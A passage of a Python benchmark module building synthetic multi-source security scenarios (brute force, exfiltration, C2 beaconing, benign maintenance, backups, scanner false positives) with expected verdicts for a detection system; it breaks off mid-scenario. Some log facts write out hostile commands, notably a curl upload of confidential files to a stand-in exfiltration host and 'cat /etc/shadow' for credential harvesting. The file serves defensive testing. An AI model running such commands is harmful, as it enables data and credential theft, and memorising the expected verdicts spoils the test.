"""Mixed-source benchmark scenarios for cross-source correlation testing.

Six scenarios (SC-013 through SC-018) using facts from multiple SourceTypes
(SYSLOG, NETFLOW, AUTH_LOG, PROCESS_LIST). Every scenario requires at least
two source types; SC-013, SC-015, and SC-018 use three or more.

These scenarios enable a fair re-test of multi-turn debate accuracy against
a richer evidence distribution than the original single-source corpus.

Public API:
    get_mixed_source_scenarios()  -> tuple of 6 BenchmarkScenarios
    get_combined_corpus()         -> tuple of all 18 BenchmarkScenarios
    get_mixed_scenario_by_id()    -> single scenario by ID
"""

from __future__ import annotations

from datetime import datetime

from ares.dialectic.evidence.fact import EntityType, Fact
from ares.dialectic.evidence.packet import EvidencePacket, TimeWindow
from ares.dialectic.evidence.provenance import Provenance, SourceType
from ares.dialectic.scripts.scenario_corpus import (
    BenchmarkScenario,
    ScenarioMetadata,
    get_all_scenarios as _get_original_scenarios,
)


# =============================================================================
# Helpers
# =============================================================================

def _make_fact(
    prefix: str,
    num: int,
    entity_id: str,
    entity_type: EntityType,
    field: str,
    value: object,
    timestamp: datetime,
    source_type: SourceType,
    source_ref: str,
) -> Fact:
    """Create a Fact with consistent naming conventions."""
    return Fact(
        fact_id=f"{prefix}-fact-{num:03d}",
        entity_id=entity_id,
        entity_type=entity_type,
        field=field,
        value=value,
        timestamp=timestamp,
        provenance=Provenance(
            source_type=source_type,
            source_id=source_ref,
            parser_version="1.0.0",
        ),
    )


# =============================================================================
# SC-013: Coordinated Brute Force Attack
# Sources: SYSLOG + NETFLOW + AUTH_LOG (3 sources)
# =============================================================================

def build_sc013_coordinated_brute_force() -> BenchmarkScenario:
    """SC-013: Coordinated brute force with SSH pivot to RDP.

    External attacker brute-forces SSH on a Linux server, gets blocked by
    the firewall, then shifts to RDP on a Windows host and succeeds.
    Cross-source correlation: Syslog shows failures, NetFlow shows volume
    and pivot, AUTH_LOG shows the successful compromise.
    """
    ts_base = datetime(2026, 3, 18, 14, 0, 0)
    prefix = "sc013"
    syslog_src = "webserver01:auth:2026-03-18"
    netflow_src = "router01:netflow:2026-03-18"
    auth_src = "dc01:Security:2026-03-18T14:25:00Z"

    packet = EvidencePacket(
        packet_id=f"{prefix}-coordinated-brute-force",
        time_window=TimeWindow(
            start=datetime(2026, 3, 18, 13, 50, 0),
            end=datetime(2026, 3, 18, 15, 0, 0),
        ),
    )

    facts = [
        # --- Syslog: SSH failures and firewall blocks (facts 1-8) ---
        _make_fact(prefix, 1, "ssh-fail-1", EntityType.NODE, "event_type",
                   "ssh_failed", ts_base, SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 2, "ssh-fail-1", EntityType.NODE, "source_ip",
                   "203.0.113.50", ts_base, SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 3, "ssh-fail-2", EntityType.NODE, "event_type",
                   "ssh_failed", datetime(2026, 3, 18, 14, 0, 15),
                   SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 4, "ssh-fail-3", EntityType.NODE, "event_type",
                   "ssh_failed", datetime(2026, 3, 18, 14, 0, 30),
                   SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 5, "ssh-fail-4", EntityType.NODE, "event_type",
                   "ssh_failed", datetime(2026, 3, 18, 14, 0, 45),
                   SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 6, "ssh-invalid", EntityType.NODE, "event_type",
                   "ssh_invalid_user", datetime(2026, 3, 18, 14, 1, 0),
                   SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 7, "fw-block-1", EntityType.NODE, "event_type",
                   "firewall_block", datetime(2026, 3, 18, 14, 1, 10),
                   SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 8, "fw-block-2", EntityType.NODE, "event_type",
                   "firewall_block", datetime(2026, 3, 18, 14, 1, 20),
                   SourceType.SYSLOG, syslog_src),

        # --- NetFlow: scan flows + RDP pivot (facts 9-14) ---
        _make_fact(prefix, 9, "flow-scan-1", EntityType.EDGE, "network_connection",
                   "203.0.113.50:44231 -> 10.0.1.100:22/TCP (SYN-only, 3 pkts, 180 bytes)",
                   datetime(2026, 3, 18, 14, 0, 3),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 10, "flow-scan-2", EntityType.EDGE, "network_connection",
                   "203.0.113.50:44232 -> 10.0.1.100:22/TCP (SYN-only, 3 pkts, 180 bytes)",
                   datetime(2026, 3, 18, 14, 0, 18),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 11, "flow-scan-3", EntityType.EDGE, "network_connection",
                   "203.0.113.50:44233 -> 10.0.1.100:22/TCP (SYN-only, 3 pkts, 180 bytes)",
                   datetime(2026, 3, 18, 14, 0, 33),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 12, "flow-scan-4", EntityType.EDGE, "network_connection",
                   "203.0.113.50:44234 -> 10.0.1.100:22/TCP (SYN-only, 2 pkts, 120 bytes)",
                   datetime(2026, 3, 18, 14, 0, 48),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 13, "flow-scan-5", EntityType.EDGE, "network_connection",
                   "203.0.113.50:44235 -> 10.0.1.100:22/TCP (SYN-only, 2 pkts, 120 bytes)",
                   datetime(2026, 3, 18, 14, 1, 3),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 14, "flow-rdp-pivot", EntityType.EDGE, "network_connection",
                   "203.0.113.50:49500 -> 10.0.1.200:3389/TCP (540s, 3200 pkts, 1.8MB)",
                   datetime(2026, 3, 18, 14, 10, 0),
                   SourceType.NETFLOW, netflow_src),

        # --- AUTH_LOG: successful RDP logon + privilege (facts 15-16) ---
        _make_fact(prefix, 15, "rdp-logon", EntityType.NODE, "logon_type",
                   "10 (RemoteInteractive via RDP from 203.0.113.50)",
                   datetime(2026, 3, 18, 14, 10, 5),
                   SourceType.AUTH_LOG, auth_src),
        _make_fact(prefix, 16, "priv-assign", EntityType.NODE, "special_privileges",
                   "SeDebugPrivilege, SeBackupPrivilege assigned to attacker_user",
                   datetime(2026, 3, 18, 14, 10, 6),
                   SourceType.AUTH_LOG, auth_src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-013",
        name="Coordinated Brute Force Attack",
        description="SSH brute force blocked by firewall, attacker pivots to RDP and succeeds",
        mitre_attack_ids=("T1110",),
        mitre_tactic="Credential Access",
        difficulty_tier=2,
        expected_verdict="THREAT_CONFIRMED",
        expected_winner="ARCHITECT",
        fact_count=len(facts),
        notes="Tier 2 — 3 sources (SYSLOG+NETFLOW+AUTH_LOG); cross-source pivot is the tell",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


# =============================================================================
# SC-014: Data Exfiltration with Cover Traffic
# Sources: NETFLOW + PROCESS_LIST (2 sources)
# =============================================================================

def build_sc014_exfiltration_with_cover() -> BenchmarkScenario:
    """SC-014: Data exfiltration hidden among normal HTTPS traffic.

    Insider archives sensitive files and exfiltrates them over HTTPS.
    Normal browsing flows provide cover. Windows shows the archiving
    and cleanup; NetFlow shows the volume anomaly.
    """
    ts_base = datetime(2026, 3, 18, 2, 15, 0)  # After hours
    prefix = "sc014"
    proc_src = "ws042:Security:2026-03-18T02:15:00Z"
    netflow_src = "router01:netflow:2026-03-18"

    packet = EvidencePacket(
        packet_id=f"{prefix}-exfiltration-cover",
        time_window=TimeWindow(
            start=datetime(2026, 3, 18, 2, 0, 0),
            end=datetime(2026, 3, 18, 3, 0, 0),
        ),
    )

    facts = [
        # --- PROCESS_LIST: archiving and cleanup (facts 1-6) ---
        _make_fact(prefix, 1, "proc-7z", EntityType.NODE, "process_name",
                   "C:\\Program Files\\7-Zip\\7z.exe",
                   ts_base, SourceType.PROCESS_LIST, proc_src),
        _make_fact(prefix, 2, "proc-7z", EntityType.NODE, "command_line",
                   "7z.exe a C:\\Users\\jsmith\\AppData\\Local\\Temp\\update.7z C:\\Confidential\\",
                   ts_base, SourceType.PROCESS_LIST, proc_src),
        _make_fact(prefix, 3, "proc-curl", EntityType.NODE, "process_name",
                   "C:\\Windows\\System32\\curl.exe",
                   datetime(2026, 3, 18, 2, 20, 0),
                   SourceType.PROCESS_LIST, proc_src),
        _make_fact(prefix, 4, "proc-curl", EntityType.NODE, "command_line",
                   "curl.exe -X POST -F file=@update.7z https://storage.exfil-domain.com/upload",
                   datetime(2026, 3, 18, 2, 20, 0),
                   SourceType.PROCESS_LIST, proc_src),
        _make_fact(prefix, 5, "proc-del", EntityType.NODE, "process_name",
                   "C:\\Windows\\System32\\cmd.exe",
                   datetime(2026, 3, 18, 2, 25, 0),
                   SourceType.PROCESS_LIST, proc_src),
        _make_fact(prefix, 6, "proc-del", EntityType.NODE, "command_line",
                   "cmd.exe /c del /q C:\\Users\\jsmith\\AppData\\Local\\Temp\\update.7z",
                   datetime(2026, 3, 18, 2, 25, 0),
                   SourceType.PROCESS_LIST, proc_src),

        # --- NETFLOW: cover traffic + exfiltration flow (facts 7-13) ---
        _make_fact(prefix, 7, "flow-normal-1", EntityType.EDGE, "network_connection",
                   "10.0.1.42:52000 -> 13.107.42.14:443/TCP (5s, 45 pkts, 32KB) — cdn.microsoft.com",
                   datetime(2026, 3, 18, 2, 10, 0),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 8, "flow-normal-2", EntityType.EDGE, "network_connection",
                   "10.0.1.42:52100 -> 142.250.80.46:443/TCP (3s, 30 pkts, 18KB) — google.com",
                   datetime(2026, 3, 18, 2, 12, 0),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 9, "flow-normal-3", EntityType.EDGE, "network_connection",
                   "10.0.1.42:52200 -> 151.101.1.69:443/TCP (4s, 38 pkts, 25KB) — reddit.com",
                   datetime(2026, 3, 18, 2, 14, 0),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 10, "flow-dns-exfil", EntityType.EDGE, "network_connection",
                   "10.0.1.42:55000 -> 8.8.8.8:53/UDP (50ms, 2 pkts, 180B) — DNS for exfil-domain.com",
                   datetime(2026, 3, 18, 2, 19, 0),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 11, "flow-exfil", EntityType.EDGE, "network_connection",
                   "10.0.1.42:49000 -> 198.51.100.99:443/TCP (180s, 12000 pkts, 15.5MB) — exfil upload",
                   datetime(2026, 3, 18, 2, 20, 5),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 12, "flow-exfil", EntityType.EDGE, "bytes_transferred",
                   "15500000 bytes outbound to 198.51.100.99 (10x normal HTTPS volume)",
                   datetime(2026, 3, 18, 2, 20, 5),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 13, "flow-exfil", EntityType.EDGE, "flow_direction",
                   "outbound (RFC1918 src 10.0.1.42 -> public 198.51.100.99)",
                   datetime(2026, 3, 18, 2, 20, 5),
                   SourceType.NETFLOW, netflow_src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-014",
        name="Data Exfiltration with Cover Traffic",
        description="Insider archives and exfiltrates data over HTTPS, hidden among normal browsing",
        mitre_attack_ids=("T1041", "T1560"),
        mitre_tactic="Exfiltration",
        difficulty_tier=3,
        expected_verdict="THREAT_CONFIRMED",
        expected_winner="ARCHITECT",
        fact_count=len(facts),
        notes="Tier 3 — 2 sources (NETFLOW+PROCESS_LIST); volume anomaly + after-hours timing",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


# =============================================================================
# SC-015: Legitimate Infrastructure Maintenance
# Sources: SYSLOG + NETFLOW + AUTH_LOG + PROCESS_LIST (all 4)
# =============================================================================

def build_sc015_legitimate_maintenance() -> BenchmarkScenario:
    """SC-015: Routine sysadmin maintenance — looks suspicious but is normal.

    Admin SSH into servers, runs updates, restarts services, transfers config
    backups. Everything looks like lateral movement + exfiltration in isolation
    but is completely authorized business-hours maintenance.
    """
    ts_base = datetime(2026, 3, 18, 10, 0, 0)  # Business hours
    prefix = "sc015"
    syslog_src = "webserver01:auth:2026-03-18"
    netflow_src = "router01:netflow:2026-03-18"
    auth_src = "mgmt01:Security:2026-03-18T10:00:00Z"
    proc_src = "mgmt01:Security:2026-03-18T10:00:00Z"

    packet = EvidencePacket(
        packet_id=f"{prefix}-legitimate-maintenance",
        time_window=TimeWindow(
            start=datetime(2026, 3, 18, 9, 45, 0),
            end=datetime(2026, 3, 18, 11, 0, 0),
        ),
    )

    facts = [
        # --- AUTH_LOG: admin logon to management workstation (facts 1-3) ---
        _make_fact(prefix, 1, "admin-logon", EntityType.NODE, "logon_type",
                   "2 (Interactive logon — admin at console)",
                   ts_base, SourceType.AUTH_LOG, auth_src),
        _make_fact(prefix, 2, "admin-logon", EntityType.NODE, "logon_account",
                   "CORP\\admin_ops (member of Infrastructure-Admins group)",
                   ts_base, SourceType.AUTH_LOG, auth_src),
        _make_fact(prefix, 3, "admin-logon", EntityType.NODE, "logon_time",
                   "2026-03-18T10:00:00Z (within scheduled maintenance window 09:00-12:00)",
                   ts_base, SourceType.AUTH_LOG, auth_src),

        # --- SYSLOG: SSH login + maintenance commands (facts 4-8) ---
        _make_fact(prefix, 4, "ssh-admin", EntityType.NODE, "event_type",
                   "ssh_accepted", datetime(2026, 3, 18, 10, 5, 0),
                   SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 5, "ssh-admin", EntityType.NODE, "source_ip",
                   "10.0.1.10 (admin workstation — known management IP)",
                   datetime(2026, 3, 18, 10, 5, 0),
                   SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 6, "sudo-update", EntityType.NODE, "event_type",
                   "sudo_command", datetime(2026, 3, 18, 10, 10, 0),
                   SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 7, "sudo-update", EntityType.NODE, "command",
                   "apt update && apt upgrade -y (routine package updates)",
                   datetime(2026, 3, 18, 10, 10, 0),
                   SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 8, "svc-restart", EntityType.NODE, "event_type",
                   "service_stopped then service_started: nginx (planned restart)",
                   datetime(2026, 3, 18, 10, 25, 0),
                   SourceType.SYSLOG, syslog_src),

        # --- NETFLOW: SSH session + SCP transfer + apt traffic (facts 9-12) ---
        _make_fact(prefix, 9, "flow-ssh", EntityType.EDGE, "network_connection",
                   "10.0.1.10:49500 -> 10.0.1.100:22/TCP (30min, 8500 pkts, 2.1MB) — admin SSH session",
                   datetime(2026, 3, 18, 10, 5, 0),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 10, "flow-scp", EntityType.EDGE, "network_connection",
                   "10.0.1.100:22 -> 10.0.1.10:49600/TCP (120s, 4000 pkts, 8.5MB) — config backup via SCP",
                   datetime(2026, 3, 18, 10, 30, 0),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 11, "flow-apt", EntityType.EDGE, "network_connection",
                   "10.0.1.100:52000 -> 91.189.91.83:80/TCP (45s, 2000 pkts, 12MB) — archive.ubuntu.com",
                   datetime(2026, 3, 18, 10, 11, 0),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 12, "flow-ssh", EntityType.EDGE, "flow_direction",
                   "internal (10.0.1.10 -> 10.0.1.100 — both RFC1918)",
                   datetime(2026, 3, 18, 10, 5, 0),
                   SourceType.NETFLOW, netflow_src),

        # --- PROCESS_LIST: scheduled backup + management tools (facts 13-16) ---
        _make_fact(prefix, 13, "proc-backup", EntityType.NODE, "process_name",
                   "BackupConfigs.ps1",
                   datetime(2026, 3, 18, 10, 30, 0),
                   SourceType.PROCESS_LIST, proc_src),
        _make_fact(prefix, 14, "proc-backup", EntityType.NODE, "command_line",
                   "powershell.exe -File C:\\Scripts\\BackupConfigs.ps1 -Target \\\\nas01\\configs\\",
                   datetime(2026, 3, 18, 10, 30, 0),
                   SourceType.PROCESS_LIST, proc_src),
        _make_fact(prefix, 15, "change-ticket", EntityType.NODE, "authorization_status",
                   "CHG-2026-0318: Approved maintenance window 09:00-12:00 by Change Advisory Board",
                   ts_base, SourceType.PROCESS_LIST, proc_src),
        _make_fact(prefix, 16, "admin-role", EntityType.NODE, "user_role",
                   "admin_ops: Infrastructure-Admins group (authorized for server maintenance)",
                   ts_base, SourceType.PROCESS_LIST, proc_src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-015",
        name="Legitimate Infrastructure Maintenance",
        description="Routine sysadmin maintenance: SSH, updates, service restarts, config backups",
        mitre_attack_ids=("T1021", "T1078"),
        mitre_tactic="Legitimate Operations",
        difficulty_tier=3,
        expected_verdict="THREAT_DISMISSED",
        expected_winner="SKEPTIC",
        fact_count=len(facts),
        notes="Tier 3 — 4 sources; business hours + change ticket + internal IPs = benign",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


# =============================================================================
# SC-016: C2 Beaconing with Lateral Movement
# Sources: NETFLOW + SYSLOG (2 sources)
# =============================================================================

def build_sc016_c2_beaconing_lateral() -> BenchmarkScenario:
    """SC-016: C2 beaconing at regular intervals + lateral movement.

    Compromised host beacons to C2 server at ~60-minute intervals,
    then begins lateral movement via SSH to internal hosts. NetFlow
    reveals the cadence; Syslog shows post-compromise activity.
    """
    ts_base = datetime(2026, 3, 18, 8, 0, 0)
    prefix = "sc016"
    netflow_src = "router01:netflow:2026-03-18"
    syslog_src = "db01:auth:2026-03-18"

    packet = EvidencePacket(
        packet_id=f"{prefix}-c2-beaconing-lateral",
        time_window=TimeWindow(
            start=datetime(2026, 3, 18, 7, 50, 0),
            end=datetime(2026, 3, 18, 13, 0, 0),
        ),
    )

    facts = [
        # --- NETFLOW: C2 beaconing at regular intervals (facts 1-5) ---
        _make_fact(prefix, 1, "beacon-1", EntityType.EDGE, "network_connection",
                   "10.0.1.100:48000 -> 192.0.2.100:8443/TCP (5s, 8 pkts, 2048B)",
                   datetime(2026, 3, 18, 8, 0, 0),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 2, "beacon-2", EntityType.EDGE, "network_connection",
                   "10.0.1.100:48001 -> 192.0.2.100:8443/TCP (5s, 8 pkts, 2100B)",
                   datetime(2026, 3, 18, 9, 0, 0),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 3, "beacon-3", EntityType.EDGE, "network_connection",
                   "10.0.1.100:48002 -> 192.0.2.100:8443/TCP (5s, 9 pkts, 2050B)",
                   datetime(2026, 3, 18, 10, 0, 0),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 4, "beacon-4", EntityType.EDGE, "network_connection",
                   "10.0.1.100:48003 -> 192.0.2.100:8443/TCP (5s, 8 pkts, 2080B)",
                   datetime(2026, 3, 18, 11, 0, 0),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 5, "beacon-5", EntityType.EDGE, "network_connection",
                   "10.0.1.100:48004 -> 192.0.2.100:8443/TCP (6s, 9 pkts, 2120B)",
                   datetime(2026, 3, 18, 12, 0, 0),
                   SourceType.NETFLOW, netflow_src),

        # --- NETFLOW: lateral movement to internal hosts (facts 6-8) ---
        _make_fact(prefix, 6, "lateral-flow-1", EntityType.EDGE, "network_connection",
                   "10.0.1.100:49200 -> 10.0.1.50:22/TCP (300s, 1500 pkts, 850KB) — internal SSH",
                   datetime(2026, 3, 18, 10, 30, 0),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 7, "lateral-flow-2", EntityType.EDGE, "network_connection",
                   "10.0.1.100:49300 -> 10.0.1.60:22/TCP (240s, 1200 pkts, 720KB) — internal SSH",
                   datetime(2026, 3, 18, 11, 15, 0),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 8, "data-upload", EntityType.EDGE, "network_connection",
                   "10.0.1.100:49400 -> 192.0.2.100:8443/TCP (120s, 5000 pkts, 5.2MB) — data exfil to C2",
                   datetime(2026, 3, 18, 12, 5, 0),
                   SourceType.NETFLOW, netflow_src),

        # --- NETFLOW: beacon cadence metadata (fact 9) ---
        _make_fact(prefix, 9, "beacon-pattern", EntityType.EDGE, "beacon_interval",
                   "5 flows to 192.0.2.100:8443 at exact 60-min intervals (08:00, 09:00, 10:00, 11:00, 12:00)",
                   datetime(2026, 3, 18, 12, 0, 0),
                   SourceType.NETFLOW, netflow_src),

        # --- SYSLOG: SSH logins on target hosts + post-compromise commands (facts 10-15) ---
        _make_fact(prefix, 10, "ssh-lateral-1", EntityType.NODE, "event_type",
                   "ssh_accepted", datetime(2026, 3, 18, 10, 30, 5),
                   SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 11, "ssh-lateral-1", EntityType.NODE, "source_ip",
                   "10.0.1.100 (compromised host)",
                   datetime(2026, 3, 18, 10, 30, 5),
                   SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 12, "sudo-shadow", EntityType.NODE, "event_type",
                   "sudo_command", datetime(2026, 3, 18, 10, 35, 0),
                   SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 13, "sudo-shadow", EntityType.NODE, "command",
                   "cat /etc/shadow (credential harvesting)",
                   datetime(2026, 3, 18, 10, 35, 0),
                   SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 14, "sudo-tar", EntityType.NODE, "event_type",
                   "sudo_command", datetime(2026, 3, 18, 11, 20, 0),
                   SourceType.SYSLOG, syslog_src),
        _make_fact(prefix, 15, "sudo-tar", EntityType.NODE, "command",
                   "tar -czf /tmp/data.tar.gz /var/log/ (data collection for exfiltration)",
                   datetime(2026, 3, 18, 11, 20, 0),
                   SourceType.SYSLOG, syslog_src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-016",
        name="C2 Beaconing with Lateral Movement",
        description="Regular-interval C2 beaconing + SSH lateral movement + data exfiltration",
        mitre_attack_ids=("T1071", "T1021"),
        mitre_tactic="Command and Control",
        difficulty_tier=4,
        expected_verdict="THREAT_CONFIRMED",
        expected_winner="ARCHITECT",
        fact_count=len(facts),
        notes="Tier 4 — 2 sources (NETFLOW+SYSLOG); beaconing cadence is the key indicator",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


# =============================================================================
# SC-017: Cloud Backup vs Exfiltration (Ambiguous)
# Sources: NETFLOW + PROCESS_LIST (2 sources)
# =============================================================================

def build_sc017_cloud_backup_ambiguity() -> BenchmarkScenario:
    """SC-017: Large nightly data transfer to cloud — backup or exfiltration?

    Scheduled backup job transfers data to cloud storage. Volume is 3x typical
    but within historical variance. No lateral movement, no credential theft,
    no archive creation outside normal paths. Deliberately ambiguous.
    """
    ts_base = datetime(2026, 3, 18, 1, 0, 0)  # 1 AM — scheduled window
    prefix = "sc017"
    proc_src = "fileserver01:Security:2026-03-18T01:00:00Z"
    netflow_src = "router01:netflow:2026-03-18"

    packet = EvidencePacket(
        packet_id=f"{prefix}-cloud-backup-ambiguity",
        time_window=TimeWindow(
            start=datetime(2026, 3, 18, 0, 50, 0),
            end=datetime(2026, 3, 18, 2, 0, 0),
        ),
    )

    facts = [
        # --- PROCESS_LIST: backup process execution (facts 1-5) ---
        _make_fact(prefix, 1, "task-sched", EntityType.NODE, "scheduled_task",
                   "CloudBackup (runs nightly at 01:00, authorized by IT Operations)",
                   ts_base, SourceType.PROCESS_LIST, proc_src),
        _make_fact(prefix, 2, "proc-backup", EntityType.NODE, "process_name",
                   "C:\\Program Files\\CloudBackup\\CloudBackup.exe",
                   datetime(2026, 3, 18, 1, 0, 5),
                   SourceType.PROCESS_LIST, proc_src),
        _make_fact(prefix, 3, "proc-backup", EntityType.NODE, "command_line",
                   "CloudBackup.exe --config D:\\Backup\\nightly.conf --dest s3://corp-backup-prod/",
                   datetime(2026, 3, 18, 1, 0, 5),
                   SourceType.PROCESS_LIST, proc_src),
        _make_fact(prefix, 4, "proc-child", EntityType.NODE, "process_name",
                   "C:\\Program Files\\CloudBackup\\s3sync.exe",
                   datetime(2026, 3, 18, 1, 0, 10),
                   SourceType.PROCESS_LIST, proc_src),
        _make_fact(prefix, 5, "proc-child", EntityType.NODE, "command_line",
                   "s3sync.exe --bucket corp-backup-prod --region us-east-1 --source D:\\FileShares\\",
                   datetime(2026, 3, 18, 1, 0, 10),
                   SourceType.PROCESS_LIST, proc_src),

        # --- NETFLOW: large transfer + DNS (facts 6-11) ---
        _make_fact(prefix, 6, "flow-dns", EntityType.EDGE, "network_connection",
                   "10.0.1.30:55000 -> 10.0.1.1:53/UDP (50ms, 2 pkts, 180B) — DNS for s3.amazonaws.com",
                   datetime(2026, 3, 18, 1, 0, 8),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 7, "flow-backup", EntityType.EDGE, "network_connection",
                   "10.0.1.30:49000 -> 52.216.100.45:443/TCP (1200s, 45000 pkts, 520MB) — S3 upload",
                   datetime(2026, 3, 18, 1, 0, 15),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 8, "flow-backup", EntityType.EDGE, "bytes_transferred",
                   "520000000 bytes outbound (typical nightly: ~170MB, max historical: ~600MB)",
                   datetime(2026, 3, 18, 1, 0, 15),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 9, "flow-backup", EntityType.EDGE, "flow_direction",
                   "outbound (RFC1918 src 10.0.1.30 -> public 52.216.100.45)",
                   datetime(2026, 3, 18, 1, 0, 15),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 10, "flow-backup", EntityType.EDGE, "destination_reputation",
                   "52.216.100.45: AWS S3 IP range (legitimate cloud provider)",
                   datetime(2026, 3, 18, 1, 0, 15),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 11, "volume-note", EntityType.NODE, "volume_anomaly",
                   "Transfer 3x typical nightly volume but within historical max variance",
                   datetime(2026, 3, 18, 1, 20, 0),
                   SourceType.NETFLOW, netflow_src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-017",
        name="Cloud Backup vs Exfiltration (Ambiguous)",
        description="Large nightly backup transfer to cloud — 3x typical volume but within variance",
        mitre_attack_ids=("T1567",),
        mitre_tactic="Exfiltration (or Legitimate Backup)",
        difficulty_tier=4,
        expected_verdict="INCONCLUSIVE",
        expected_winner="BALANCED",
        fact_count=len(facts),
        notes="Tier 4 — 2 sources (NETFLOW+PROCESS_LIST); designed to test uncertainty calibration",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


# =============================================================================
# SC-018: Multi-Source False Positive Cascade (Vulnerability Scanner)
# Sources: SYSLOG + NETFLOW + AUTH_LOG + PROCESS_LIST (all 4)
# =============================================================================

def build_sc018_scanner_false_positive() -> BenchmarkScenario:
    """SC-018: Vulnerability scanner triggers alerts across all sources.

    Authorized weekly scan from internal scanner host triggers firewall logs,
    failed connections, and security events. Looks like port scan attack but
    is authorized security tooling with service account credentials.
    """
    ts_base = datetime(2026, 3, 18, 8, 0, 0)  # Business hours, scheduled scan
    prefix = "sc018"
    syslog_fw_src = "fw01:kern:2026-03-18"
    syslog_scanner_src = "scanner01:auth:2026-03-18"
    netflow_src = "router01:netflow:2026-03-18"
    auth_src = "dc01:Security:2026-03-18T08:00:00Z"
    proc_src = "scanner01:Security:2026-03-18T08:00:00Z"

    packet = EvidencePacket(
        packet_id=f"{prefix}-scanner-false-positive",
        time_window=TimeWindow(
            start=datetime(2026, 3, 18, 7, 50, 0),
            end=datetime(2026, 3, 18, 10, 0, 0),
        ),
    )

    facts = [
        # --- SYSLOG: firewall blocks + SSH failures from scanner (facts 1-5) ---
        _make_fact(prefix, 1, "fw-block-scan-1", EntityType.NODE, "event_type",
                   "firewall_block", ts_base,
                   SourceType.SYSLOG, syslog_fw_src),
        _make_fact(prefix, 2, "fw-block-scan-1", EntityType.NODE, "src_ip",
                   "10.0.1.250 (scanner host)", ts_base,
                   SourceType.SYSLOG, syslog_fw_src),
        _make_fact(prefix, 3, "fw-block-scan-2", EntityType.NODE, "event_type",
                   "firewall_block", datetime(2026, 3, 18, 8, 0, 5),
                   SourceType.SYSLOG, syslog_fw_src),
        _make_fact(prefix, 4, "ssh-scan-fail", EntityType.NODE, "event_type",
                   "ssh_failed", datetime(2026, 3, 18, 8, 5, 0),
                   SourceType.SYSLOG, syslog_fw_src),
        _make_fact(prefix, 5, "scanner-proc-syslog", EntityType.NODE, "event_type",
                   "sudo_command", datetime(2026, 3, 18, 7, 55, 0),
                   SourceType.SYSLOG, syslog_scanner_src),

        # --- SYSLOG: scanner process (fact 6) ---
        _make_fact(prefix, 6, "scanner-proc-syslog", EntityType.NODE, "command",
                   "/opt/nessus/sbin/nessusd --config /opt/nessus/etc/nessus/nessusd.conf",
                   datetime(2026, 3, 18, 7, 55, 0),
                   SourceType.SYSLOG, syslog_scanner_src),

        # --- NETFLOW: port scanning pattern from scanner IP (facts 7-11) ---
        _make_fact(prefix, 7, "scan-flow-1", EntityType.EDGE, "network_connection",
                   "10.0.1.250:40000 -> 10.0.1.10:22/TCP (SYN-only, 2 pkts, 120B)",
                   datetime(2026, 3, 18, 8, 0, 1),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 8, "scan-flow-2", EntityType.EDGE, "network_connection",
                   "10.0.1.250:40001 -> 10.0.1.10:80/TCP (SYN-only, 2 pkts, 120B)",
                   datetime(2026, 3, 18, 8, 0, 2),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 9, "scan-flow-3", EntityType.EDGE, "network_connection",
                   "10.0.1.250:40002 -> 10.0.1.10:443/TCP (SYN-only, 2 pkts, 120B)",
                   datetime(2026, 3, 18, 8, 0, 3),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 10, "scan-flow-4", EntityType.EDGE, "network_connection",
